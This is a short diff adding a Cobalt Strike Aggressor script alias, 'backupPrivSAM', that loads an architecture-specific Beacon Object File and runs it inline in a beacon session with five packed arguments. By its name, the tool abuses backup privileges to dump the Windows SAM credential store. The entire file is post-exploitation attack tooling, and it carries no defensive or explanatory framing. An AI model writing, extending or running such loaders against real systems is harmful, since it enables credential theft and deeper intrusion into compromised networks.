@@ -1,0 +1,21 @@
+alias backupPrivSAM {
+	local('$barch $handle $data $args');
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	# $handle = openf(script_resource("backupprivsam. $+ $barch $+ .o"));
+    $handle = openf(script_resource("backupprivsam. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+	
+	# pack our arguments
+	$args   = bof_pack($1, "ZZZZZ", $2, $3, $4, $5, $6);
+	
+	# announce what we're doing
+	btask($1, "Launching backupPrivSAM...");
+	
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
